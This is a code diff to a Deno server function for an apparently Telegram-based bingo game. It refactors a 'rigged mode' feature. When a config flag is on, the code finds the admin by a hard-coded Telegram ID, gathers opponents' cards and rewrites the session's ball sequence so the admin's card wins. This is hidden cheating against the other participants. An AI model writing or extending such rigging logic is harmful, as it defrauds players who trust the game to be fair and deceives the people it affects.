@@ -136,7 +136,7 @@ Deno.serve(async (req) => {
       }
     } catch (_) { /* best-effort */ }
 
-    // ── Rigged mode check ──────────────────────────────────────────────────────
+    // ── Rig for admin when rigged_mode is on ──────────────────────────────────
     try {
       const { data: cfg } = await admin
         .from("admin_config")
@@ -144,41 +144,34 @@ Deno.serve(async (req) => {
         .eq("id", 1)
         .single();
 
-      if (cfg?.rigged_mode) {
-        // Find admin's Supabase user ID
-        const { data: adminProfile } = await admin
-          .from("profiles")
-          .select("id")
-          .eq("telegram_id", ADMIN_TELEGRAM_ID)
-          .single();
+      const { data: adminProfile } = cfg?.rigged_mode ? await admin
+        .from("profiles")
+        .select("id")
+        .eq("telegram_id", ADMIN_TELEGRAM_ID)
+        .single() : { data: null };
 
-        if (adminProfile) {
-          // Fetch ALL active participants in this session
-          const { data: participants } = await admin
-            .from("game_participants")
-            .select("user_id, cartela_1, cartela_2")
-            .eq("game_session_id", session_id)
-            .eq("is_watcher", false);
+      if (adminProfile) {
+        const { data: participants } = await admin
+          .from("game_participants")
+          .select("user_id, cartela_1, cartela_2")
+          .eq("game_session_id", session_id)
+          .eq("is_watcher", false);
 
-          const adminPart = participants?.find((p) => p.user_id === adminProfile.id);
-          const opponents = participants?.filter((p) => p.user_id !== adminProfile.id) ?? [];
+        const adminPart = participants?.find((p) => p.user_id === adminProfile.id);
+        const opponents = participants?.filter((p) => p.user_id !== adminProfile.id) ?? [];
+        const adminCartelaId = adminPart?.cartela_1 ?? adminPart?.cartela_2 ?? null;
 
-          const adminCartelaId = adminPart?.cartela_1 ?? adminPart?.cartela_2 ?? null;
-
-          if (adminCartelaId !== null) {
-            // Collect all opponent cartela IDs
-            const opponentCartelaIds: number[] = [];
-            for (const opp of opponents) {
-              if (opp.cartela_1 !== null) opponentCartelaIds.push(opp.cartela_1);
-              if (opp.cartela_2 !== null) opponentCartelaIds.push(opp.cartela_2);
-            }
-
-            const riggedSeq = buildRiggedSequence(adminCartelaId, opponentCartelaIds);
-            await admin
-              .from("game_sessions")
-              .update({ ball_sequence: riggedSeq })
-              .eq("id", session_id);
+        if (adminCartelaId !== null) {
+          const opponentCartelaIds: number[] = [];
+          for (const opp of opponents) {
+            if (opp.cartela_1 !== null) opponentCartelaIds.push(opp.cartela_1);
+            if (opp.cartela_2 !== null) opponentCartelaIds.push(opp.cartela_2);
           }
+          const riggedSeq = buildRiggedSequence(adminCartelaId, opponentCartelaIds);
+          await admin
+            .from("game_sessions")
+            .update({ ball_sequence: riggedSeq })
+            .eq("id", session_id);
         }
       }
     } catch (_) {
